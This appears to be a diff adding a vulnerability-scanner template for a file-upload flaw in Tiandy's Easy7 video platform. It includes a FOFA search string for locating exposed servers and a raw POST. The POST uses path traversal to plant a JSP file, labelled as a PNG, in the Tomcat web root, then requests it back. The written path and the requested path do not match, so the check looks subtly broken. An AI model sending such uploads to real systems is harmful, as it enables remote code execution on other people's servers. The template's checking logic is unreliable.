@@ -1,0 +1,37 @@
+id: tiandiweiye-easy7-uploadfile-fileupload
+
+info:
+  name: "天地伟业Easy7 uploadFile接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+
+    该漏洞允许攻击者通过构造恶意请求上传文件，可能导致远程代码执行或服务器被控制。
+  tags: 天地伟业Easy7
+
+flow: http(1) && http(2) 
+
+http:
+- raw:
+  - |
+    POST /Easy7/rest/file/uploadFile?fileName=../../apache-tomcat-7.0.78/webapps/Easy7/NdayTest HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys6NZxpQOUidCIuxI
+
+    ------WebKitFormBoundarys6NZxpQOUidCIuxI
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundarys6NZxpQOUidCIuxI--
+- raw:
+  - |
+    GET /Easy7/Ntest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
